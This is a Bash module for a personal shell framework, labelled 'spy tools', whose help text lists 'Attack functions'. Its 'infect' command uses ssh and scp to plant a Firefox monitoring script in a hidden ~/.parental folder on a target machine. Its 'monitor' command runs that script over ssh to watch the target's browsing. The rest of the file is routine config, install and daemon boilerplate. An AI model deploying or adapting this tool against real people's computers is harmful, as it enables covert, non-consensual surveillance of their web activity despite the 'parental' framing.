#!/bin/bash
# spy tools for GRBL casa@ujo.guru 2025

GRBL_COLOR=true # DEBUG
#GRBL_VERBOSE=2 # DEBUG
#GRBL_DEBUG=true # DEBUG
declare -g __spy=$(readlink --canonicalize --no-newline $BASH_SOURCE) # DEBUG
declare -g __spy_color="light_blue" # DEBUG
declare -g spy_rc=/tmp/$USER/gtbl_spy.rc
declare -g spy_config="$GRBL_CFG/$GRBL_USER/spy.cfg"
declare -g spy_require=(gnome-terminal)
declare -g spy_target=

spy.help () {
# spy help printout

    gr.msg -v1 "GRBL spy help " -h
    gr.msg -v2
    gr.msg -v0 "Usage:    $GRBL_CALL spy infect|monitor|check|status|help|poll|start|end|install|uninstall" -c white
    gr.msg -v2
    gr.msg -v1 "Commands:" -c white
    gr.msg -v1 " monitor              launch monitoring session on: "
    gr.msg -v1 "    firefox <target>  firefox on target "
    gr.msg -v1 " infect               copy monitoring scripts to: "
    gr.msg -v1 "    firefox <target>  firefox on target "
    gr.msg -v1 " check <something>    check stuff "
    gr.msg -v1 " status               one line status information of module "
    gr.msg -v1 " install              install required software: ${spy_require[@]}"
    gr.msg -v1 " uninstall            remove required software: ${spy_require[@]}"
    gr.msg -v1 " help                 get more detailed help by increasing verbose level '$GRBL_CALL spy -v2' "
    gr.msg -v2
    gr.msg -v2 "Options:" -c white
    gr.msg -v2 "  o                 say 'ooo-o'"
    gr.msg -v4
    gr.msg -v4 " when module called trough GRBL core.sh module options are given with double hyphen '--'"
    gr.msg -v4 " and bypassed by GRBL core.sh witch removes one hyphen to avoid collision with core.sh options. "
    gr.msg -v3
    gr.msg -v3 "Basic functions: " -c white
    gr.msg -v3 " Following functions can be used when this file is sourced by command: 'source spy.sh' "
    gr.msg -v3 " Any of external 'commands' are available after sourcing by name 'spy.<function> arguments -options' "
    gr.msg -v3
    gr.msg -v3 " spy.main           main command parser "
    gr.msg -v3 " spy.check          check all is fine, return 0 or error number "
    gr.msg -v3 " spy.status         printout one line module status output "
    gr.msg -v3 " spy.rc             lift environmental variables for module functions "
    gr.msg -v3 "                    check changes in user config and update RC file if needed "
    gr.msg -v3 "                    this enables fast user configuration and keep everything up to date "
    gr.msg -v3 " spy.make_rc        generate RC file to /tmp out of $GRBL_CFG/$GRBL_USER/spy.cfg "
    gr.msg -v3 "                    or if not exist $GRBL_CFG/spy.cfg"
    gr.msg -v3 " spy.install        install all needed software"
    gr.msg -v3 "                    stuff that can be installed by apt-get package manager are listed in  "
    gr.msg -v3 "                    'spy_require' list variable, add them there. Other software that is not "
    gr.msg -v3 "                    available in package manager, or is too old can be installed by this function. "
    gr.msg -v3 "                    Note that install.sh can proceed multi_module call for this function "
    gr.msg -v3 "                    therefore what to install (and uninstall) should be described clearly enough. "
    gr.msg -v3 " spy.uninstall      remove installed software. Do not uninstall software that may be needed "
    gr.msg -v3 "                    by other modules or user. Uninstaller asks user every software that it  "
    gr.msg -v3 "                    going to uninstall  "
    gr.msg -v3 " spy.poll           daemon interface " # TODO remove after checking need from daemon.sh
    gr.msg -v3 " spy.start          daemon interface: things needed to do when daemon request module to start "
    gr.msg -v3 " spy.stop           daemon interface: things needed to do when daemon request module to stop "
    gr.msg -v3 " spy.status         one line status printout "
    gr.msg -v3
    gr.msg -v2 " Attack functions " -c white
    gr.msg -v2
    gr.msg -v2 " spy.infect             infect target service "
    gr.msg -v2 "   <service> <target>   service = program on target device"
    gr.msg -v2 " spy.monitor            monitor varies services "
    gr.msg -v2 "   <service> <target>   service = program on target device"
    gr.msg -v2 " spy.wait_remote        wait target to answer ping "
    gr.msg -v2 " spy.monitor_firefox    listen firefox sites "
    gr.msg -v2 " spy.infect_firefox     copy monitoring scripts to target system"
    gr.msg -v2
    gr.msg -v2 "Examples:" -c white
    gr.msg -v2 "  $GRBL_CALL spy infect firefox localhost   # copy firefox scripts to localhost "
    gr.msg -v2 "  $GRBL_CALL spy monitor firefox localhost   # monitor local firefox session "
    gr.msg -v2
}

spy.main () {
# spy main command parser
    [[ $GRBL_DEBUG ]] && gr.msg -n -c $__spy_color "$__spy [$LINENO] $FUNCNAME: ">&2; [[ $GRBL_DEBUG ]] && echo "'$@'" >&2 # DEBUG

    local _first="$1"
    shift

    #gr.debug "option -a: $_op_a"
    #gr.debug "option -o: $_op_o"

    case "$_first" in
            check|status|help|poll|start|end|install|uninstall)
                spy.$_first $@
                return $?
                ;;
            monitor|infect)
                spy.$_first $@
                return $?
                ;;


           *)   gr.msg -e1 "${FUNCNAME[0]}: unknown command: '$_first'"
                return 2
    esac
}

spy.check_known () {
# check is given parameter in target list

    local _target="$1"
    shift

    if [[ $_target =~ '^[0-9]+$' ]]; then
        if [[ $_target -ge ${#GRBL_SPY_TARGET[@]} ]]; then
            gr.msg "over the list select '0..${#GRBL_SPY_TARGET[@]}'"
            return 128
        fi
        spy_target=${#GRBL_SPY_TARGET[$_target]}

    elif [[ $_target =~ ${GRBL_SPY_TARGET[@]} ]]; then
        gr.msg "known target "
        spy_target=$_target
    else
        gr.msg -n "target is not in known list "

        if ping -c1 -w1 $_target  >/dev/null; then
            gr.msg "but answers ping "
            spy_target=$_target
        else
            gr.msg "and does not answer ping.. for now "
            spy_target=$_target
        fi
    fi
}

spy.monitor () {

    local _first="$1"
    shift
    local _target="$1"
    shift

    # check and return target as 'spy_target' variable
    spy.check_known $_target || return $?

    case $_first in
        fox|firefox)
            spy.wait_remote $spy_target || return 133
            spy.monitor_firefox $spy_target
            return $?
            ;;
        *)
            gr.msg "unknown service for monitor"
            return 129
    esac
}

spy.infect () {

    local _first="$1"
    shift
    local _target="$1"
    shift

    spy.check_known $_target || return $?

    case $_first in
        fox|firefox)
            spy.wait_remote $spy_target || return 134
            spy.infect_firefox $spy_target
            return $?
            ;;
        *)
            gr.msg "unknown service for infect"
            return 130
    esac
}

spy.wait_remote () {
# Wait till
    #gr.msg -v2 "waiting $_target to answer"

    local _target=$1

    gr.msg -n "waiting $_target to answer."
    while true; do
        if ping -c1 -w1 $_target >/dev/null; then
            #ge.msg -v1 "$(date $GRBL_FORMAT_TIMESTAMP)"
            gr.msg -v1 " $(date +'%Y-%m-%d %H:%M')"
            return 0
        fi
        #gr.msg -v2 "."
        printf "."
        sleep 60
    done
    return 1
}

spy.monitor_firefox () {

    local _target=$1

    if ! spy.check_firefox $_target ; then
        gr.msg "not infected, please infect first"
        return 135
    fi

    gr.msg "opening ssh terminal.."
    gnome-terminal --hide-menubar --geometry 80x20 --zoom 1 --hide-menubar --title \
            "firefox parental" -- ssh $_target -t '~/.parental/firefox.sh'
}

spy.check_firefox () {

    local _target=$1

    gr.msg -n "checking status.. "
    if [[ $(ssh $_target -- '[[ -f ~/.parental/firefox.sh ]] && echo "infected" || echo "helfty"') == "infected" ]]; then
        return 0
    else
        return 1
    fi

}

spy.infect_firefox () {

    local _target=$1

    spy.check_firefox $_target && return 0

    gr.msg -n "checking folder.. "
    if [[ $(ssh $_target -- '[[ -d ~/.parental ]] && echo "exist" || echo "no"') == "no" ]]; then

        if ssh $_target -- mkdir ~/.parental ; then
            gr.msg "~/.parental created"
        else
            gr.msg -e1 "unable to create folder"
        fi

    else
        gr.msg -c green "ok"
    fi


    gr.msg -n "copying script.. "
    if scp $GRBL_BIN/spy/firefox.sh $_target:~/.parental; then
        ssh $_target -- "chmod +x ~/.parental/firefox.sh"
        gr.msg -c green "successful"
        return 0
    else
        gr.msg -e1 "something went wrong"
        return 132
    fi
}


spy.rc () {
# source configurations (to be faster)
    [[ $GRBL_DEBUG ]] && gr.msg -n -c $__spy_color "$__spy [$LINENO] $FUNCNAME: ">&2; [[ $GRBL_DEBUG ]] && echo "'$@'" >&2 # DEBUG

    # check is user config changed
    if [[ ! -f $spy_rc ]] \
        || [[ $(( $(stat -c %Y $GRBL_CFG/$GRBL_USER/spy.cfg) - $(stat -c %Y $spy_rc) )) -gt 0 ]]
    # if module needs more than one config file here it can be done here
    #     || [[ $(( $(stat -c %Y $GRBL_CFG/$GRBL_USER/spy.cfg) - $(stat -c %Y $spy_rc) )) -gt 0 ]] \
    #     || [[ $(( $(stat -c %Y $GRBL_CFG/$GRBL_USER/mount.cfg) - $(stat -c %Y $spy_rc) )) -gt 0 ]]
    then
        spy.make_rc && \
            gr.msg -v2 -c dark_gray "$spy_rc updated"
    fi


    # source current RC file to lift user configurations to environment
    source $spy_rc
}

spy.make_rc () {
# make RC file out of config file
    [[ $GRBL_DEBUG ]] && gr.msg -n -c $__spy_color "$__spy [$LINENO] $FUNCNAME: ">&2; [[ $GRBL_DEBUG ]] && echo "'$@'" >&2 # DEBUG

    # remove old RC file
    if [[ -f $spy_rc ]] ; then
            rm -f $spy_rc
        fi

    source config.sh
    config.make_rc "$GRBL_CFG/$GRBL_USER/spy.cfg" $spy_rc

    # config.make_rc "$GRBL_CFG/$GRBL_USER/mount.cfg" $spy_rc
    # config.make_rc "$GRBL_CFG/$GRBL_USER/spy.cfg" $spy_rc append

    # make RC executable
    chmod +x $spy_rc
}

spy.status () {
# module status one liner
    [[ $GRBL_DEBUG ]] && gr.msg -n -c $__spy_color "$__spy [$LINENO] $FUNCNAME: ">&2; [[ $GRBL_DEBUG ]] && echo "'$@'" >&2 # DEBUG

    # printout timestamp without newline
    gr.msg -t -n "${FUNCNAME[0]}: "

    # check spy is enabled and printout status
    if [[ $GRBL_SPY_ENABLED ]] ; then
        gr.msg -n -v1 -c lime "enabled, " -k $GRBL_SPY_INDICATOR_KEY
    else
        gr.msg -v1 -c black "disabled" -k $GRBL_SPY_INDICATOR_KEY
        return 1
    fi

    gr.msg -c green "ok"
}

spy.install() {
# install required software
    [[ $GRBL_DEBUG ]] && gr.msg -n -c $__spy_color "$__spy [$LINENO] $FUNCNAME: ">&2; [[ $GRBL_DEBUG ]] && echo "'$@'" >&2 # DEBUG

    local _errors=()

    # install software that is available distro's package manager repository
    for install in ${spy_require[@]} ; do
        hash $install 2>/dev/null && continue
        gr.ask -h "install $install" || continue
        sudo apt-get -y install $install || _errors+=($?)
    done


    if [[ $_error_count ]]; then
        gr.msg -e1 "${#_error_count} errors of warnings recorded: ${_error_count[@]}"
        return $_error_count
    fi
}

spy.uninstall() {
# uninstall required software
    [[ $GRBL_DEBUG ]] && gr.msg -n -c $__spy_color "$__spy [$LINENO] $FUNCNAME: ">&2; [[ $GRBL_DEBUG ]] && echo "'$@'" >&2 # DEBUG

    local _errors=()

    # remove software that is needed ONLY of this module
    for remove in ${spy_require[@]} ; do
        hash $remove 2>/dev/null || continue
        gr.ask -h "remove $remove" || continue
        sudo apt-get -y purge $remove || _errors+=($?)
    done


    if [[ $_error_count ]]; then
        gr.msg -e1 "${#_error_count} errors of warnings recorded: ${_error_count[@]}"
        return $_error_count
    fi
}

spy.option() {
    # process module options
    [[ $GRBL_DEBUG ]] && gr.msg -n -c $__spy_color "$__spy [$LINENO] $FUNCNAME: ">&2; [[ $GRBL_DEBUG ]] && echo "'$@'" >&2 # DEBUG

    local options=$(getopt -l "open;auto:;debug;verbose:" -o "doa:v:" -a -- "$@")

    if [[ $? -ne 0 ]]; then
        echo "option error"
        return 101
    fi

    eval set -- "$options"

    while true; do
        case "$1" in
            -d|debug)
                GRBL_DEBUG=true
                shift
                ;;
            -v|verbose)
                GRBL_VERBOSE=$2
                shift 2
                ;;
            -o|open)
                _op_o=true
                shift
                ;;
            -a|auto)
                _op_a="$2"
                shift 2
                ;;
            --)
                shift
                break
                ;;
        esac
    done

    spy_command_str=($@)
}

spy.poll () {
# daemon required polling functions
    [[ $GRBL_DEBUG ]] && gr.msg -n -c $__spy_color "$__spy [$LINENO] $FUNCNAME: ">&2; [[ $GRBL_DEBUG ]] && echo "'$@'" >&2 # DEBUG

    local _cmd="$1" ; shift

    case $_cmd in
        start )
            gr.msg -v1 -t -c black \
                -k $GRBL_SPY_INDICATOR_KEY \
                "${FUNCNAME[0]}: spy status polling started"
            ;;
        end )
            gr.msg -v1 -t -c reset \
                -k $GRBL_SPY_INDICATOR_KEY \
                "${FUNCNAME[0]}: spy status polling ended"
            ;;
        status )
            spy.status
            ;;
        esac
}

# update rc and get variables to environment
spy.rc

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    spy.option $@
    spy.main ${spy_command_str[@]}
    exit "$?"
else
    [[ $GRBL_DEBUG ]] && gr.msg -c $__spy_color "$__spy [$LINENO] sourced " >&2
fi

